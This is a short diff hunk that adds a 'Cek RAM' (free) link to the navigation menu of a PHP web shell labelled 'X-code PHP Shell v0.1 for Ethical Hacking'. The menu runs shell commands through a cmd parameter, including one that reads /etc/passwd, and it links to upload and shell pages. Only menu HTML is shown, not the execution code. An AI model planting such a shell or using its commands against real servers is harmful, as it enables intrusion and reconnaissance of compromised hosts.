@@ -16,7 +16,7 @@ background-color: #333366;
 <p class="style1">X-code PHP Shell v0.1 for Ethical Hacking </p>
 </div>
 <p class="style2">Oleh Kurniawan - <a href="http://xcode.or.id" target="_blank">xcode.or.id</a> </p>
-<p class="style2"><a href="?">Home</a> &#8226; <a href="?shell">Shell</a> &#8226; <a href="?inject">Upload</a> &#8226; <a href="?cmd=uname -a">Cek kernel</a> &#8226; <a href="?cmd=lsb_release -a">Cek Distro linux</a> &#8226; <a href="?cmd=php -v">Cek versi PHP</a> &#8226; <a href="?cmd=lscpu">Cek CPU</a> &#8226;  <a href="?cmd=cat /etc/passwd">Cek User linux</a></p>
+<p class="style2"><a href="?">Home</a> &#8226; <a href="?shell">Shell</a> &#8226; <a href="?inject">Upload</a> &#8226; <a href="?cmd=uname -a">Cek kernel</a> &#8226; <a href="?cmd=lsb_release -a">Cek Distro linux</a> &#8226; <a href="?cmd=php -v">Cek versi PHP</a> &#8226; <a href="?cmd=lscpu">Cek CPU</a> &#8226; <a href="?cmd=free">Cek RAM</a> &#8226; <a href="?cmd=cat /etc/passwd">Cek User linux</a></p>
 <p class="style2"><br />
 </p></td>
 </tr>
